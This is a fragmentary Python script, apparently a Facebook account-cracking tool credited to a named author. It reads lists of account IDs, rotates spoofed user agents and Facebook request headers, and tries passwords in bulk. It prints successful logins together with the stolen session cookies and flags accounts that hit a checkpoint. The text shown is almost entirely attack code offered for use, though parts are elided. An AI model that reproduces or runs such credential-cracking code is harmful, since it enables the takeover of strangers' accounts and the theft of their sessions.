...
os.system("xdg-open https://www.facebook.com/mdamirulislamh")
os.system("xdg-open")
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname = input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Amirul ,    Tools"')
pass
...
\33[1;91m╔════════════════════════════════════════╗
\33[1;92m║[•] Author    : Amirul abd Jerry            ║
\33[1;92m║[•] Facebook  : Md Amirul islam (israfil) ║
\33[1;92m║[•] Whatsapp  : +***********            ║
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/AMIRUL VAI.txt  Etc...]')
...
'x-fb-request-id': 'Aa-mGu3fLqdXHK2tfsjKBu9',
'x-fb-trace-id': 'HkpzPC2LC/j',
'x-fb-rev': '1008542831',
'x-fb-debug': 'BcA1ARUZQHc5emnnTA3+pfeq8O/LGHuRPKQizv0LArNGBfcuaPl4pzWflyEjTb4MJhKCCcpBHFavkN8nvnc5MQ==',
...
'x-fb-debug': 'BcA1ARUZQHc5emnnTA3+pfeq8O/LGHuRPKQizv0LArNGBfcuaPl4pzWflyEjTb4MJhKCCcpBHFavkN8nvnc5MQ==',
    ...
    'viewport-width': '980'}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[Amirul VAI-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[AMIRUL VAI-Ok🔥] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(
        f"\r{H}[AMIRUL VAI-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
